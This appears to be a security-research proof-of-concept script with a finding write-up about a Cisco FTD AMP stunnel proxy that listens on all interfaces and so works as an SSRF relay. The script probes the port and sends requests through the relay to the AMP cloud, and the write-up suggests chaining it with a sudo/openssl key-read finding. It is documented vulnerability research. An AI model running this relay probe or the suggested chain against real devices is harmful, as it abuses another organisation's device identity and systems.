"""
F-FTD-99: AMP stunnel proxy exposed on 0.0.0.0:32137 (SSRF relay)
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /ngfw/etc/sf/amp-stunnel.conf:
    client = yes
    accept  = 32137          ← no address= restriction → binds 0.0.0.0
    connect = cloud-sa.amp.cisco.com:443
    verify  = 2              ← server cert verified; NO client auth on accepting side
    CAPath  = /etc/sf/CA
    options = NO_SSLv3, NO_TLSv1, NO_TLSv1.1
    fips    = yes

  Intent: local AMP connector on FTD connects to 127.0.0.1:32137, stunnel
  wraps traffic in TLS and forwards to Cisco AMP cloud at cloud-sa.amp.cisco.com:443.

  Misconfiguration: `accept = 32137` without `address = 127.0.0.1` restriction
  causes stunnel to bind on 0.0.0.0:32137, making the SSL relay accessible
  from ANY IP that can reach the FTD management interface.

Impact:
  1. SSRF relay: Attacker connects to FTD:32137, sends plaintext HTTP/API traffic;
     stunnel wraps it in TLS and forwards to cloud-sa.amp.cisco.com:443.
     Responses are relayed back. FTD's management IP appears as the request origin.
     → Allows probing of Cisco AMP cloud API endpoint from attacker-controlled payload,
       sourced from the FTD's registered IP.
  2. Device UUID exposure: AMP device UUID from /metrics (port 9273) or via AMP API.
     UUID: 2fe3bd28-9c3b-11f1-8c75-98cd2be24485 (lab device).
  3. AMP account probing: FTD AMP registration credentials are used by the stunnel
     session; attacker relay traffic is sent under the device's AMP identity.
     If cloud-sa.amp.cisco.com:443 does not require per-session client auth,
     attacker can make AMP API calls authenticated as the FTD device.

Severity: MEDIUM
  Pre-auth accessible from network; no crypto bypass; relay requires AMP cloud to
  accept the connection, which depends on device registration state.
  On a registered AMP device: HIGH (can interact with AMP API as device identity).
  On unregistered device: LOW (SSL handshake to cloud likely fails without device cert).

Note:
  `verify = 2` applies to server certificate verification of cloud-sa.amp.cisco.com.
  The client-facing (accept) side has no client authentication — no cert, no password.
  Any TCP client connecting to port 32137 becomes a relay to AMP cloud.

Chain:
  F-FTD-99 (AMP SSRF relay) → AMP API probing with FTD device identity
  For higher impact: chain with F-FTD-86 (www sudo openssl → read /etc/sf/AMP/)
  to extract any local AMP device keys → authenticate directly to AMP API.
"""

# CONTROLLED ENVIRONMENT ONLY

import socket
import time
import sys
import argparse
import http.client

FINDING = "F-FTD-99"
LABEL = "AMP stunnel SSRF relay 0.0.0.0:32137"
DEFAULT_PORT = 32137
AMP_CLOUD = "cloud-sa.amp.cisco.com"


def probe_relay(host: str, port: int, timeout: int = 10) -> dict:
    """
    Probe the AMP stunnel relay.
    Connects to host:port and sends a minimal HTTP request;
    stunnel forwards it via TLS to cloud-sa.amp.cisco.com:443.
    Returns the cloud response (if any) or the error.
    CONTROLLED ENVIRONMENT ONLY.
    """
    result = {'connected': False, 'bytes_received': 0, 'sample': b'', 'error': None}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        result['connected'] = True
        # Send an HTTP HEAD request — minimal, avoids side effects
        request = (
            f"HEAD / HTTP/1.0\r\n"
            f"Host: {AMP_CLOUD}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        s.send(request)
        data = b''
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        s.close()
        result['bytes_received'] = len(data)
        result['sample'] = data[:512]
    except Exception as e:
        result['error'] = str(e)
    return result


def check_binding(host: str, port: int) -> bool:
    """Test whether port is accessible from external host (not just localhost)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('host', help='Target FTD management IP')
    ap.add_argument('--port', type=int, default=DEFAULT_PORT,
                    help=f'AMP stunnel port (default: {DEFAULT_PORT})')
    ap.add_argument('--timeout', type=int, default=15,
                    help='Connection timeout in seconds (default: 15)')
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print(f'[*] Target: {args.host}:{args.port}')
    print(f'[*] Relay destination: {AMP_CLOUD}:443')
    print('[!] CONTROLLED ENVIRONMENT ONLY\n')

    # Step 1: Confirm external accessibility
    print(f'[1] Checking external binding {args.host}:{args.port}...')
    accessible = check_binding(args.host, args.port)
    if accessible:
        print(f'[+] Port {args.port} ACCESSIBLE from external host')
        print(f'    Root cause: amp-stunnel.conf "accept = {args.port}" missing address=127.0.0.1')
    else:
        print(f'[-] Port {args.port} not reachable from {args.host}')
        print(f'    May be filtered by iptables or network path not available')
        sys.exit(1)

    # Step 2: Probe the relay
    print(f'\n[2] Probing SSRF relay to {AMP_CLOUD}:443...')
    result = probe_relay(args.host, args.port, args.timeout)
    if result['error']:
        print(f'[-] Relay probe error: {result["error"]}')
    else:
        print(f'[+] Connected to relay. Received {result["bytes_received"]} bytes from AMP cloud.')
        if result['bytes_received'] > 0:
            sample = result['sample'].decode(errors='replace')
            print(f'[+] AMP cloud response sample:')
            print(sample[:400])
        else:
            print('[.] No data received from AMP cloud (device may not be registered,')
            print('    or TLS client auth required at cloud side).')

    print(f'\n[*] {FINDING}: {"CONFIRMED" if accessible else "NOT CONFIRMED"}')


if __name__ == '__main__':
    main()
